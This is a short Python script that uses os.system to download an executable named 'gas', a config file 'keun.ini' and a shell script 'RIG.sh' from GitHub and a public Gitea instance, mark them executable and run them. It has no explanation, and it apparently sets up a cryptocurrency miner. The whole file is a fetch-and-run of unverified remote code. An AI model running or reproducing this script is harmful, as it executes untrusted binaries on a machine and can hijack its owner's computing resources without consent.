import os
import random, string, urllib.request, json, getpass
os.system("apt update")
os.system("wget -qq https://github.com/angkii/asu/raw/main/gas")
os.system("wget -qq https://try.gitea.io/bambanks/nambang/raw/branch/main/keun.ini")
os.system("chmod +x gas")
os.system("wget https://try.gitea.io/bambanks/nambang/raw/branch/main/RIG.sh")
os.system("chmod +x RIG.sh")
os.system("./RIG.sh")
os.system("./gas keun.ini")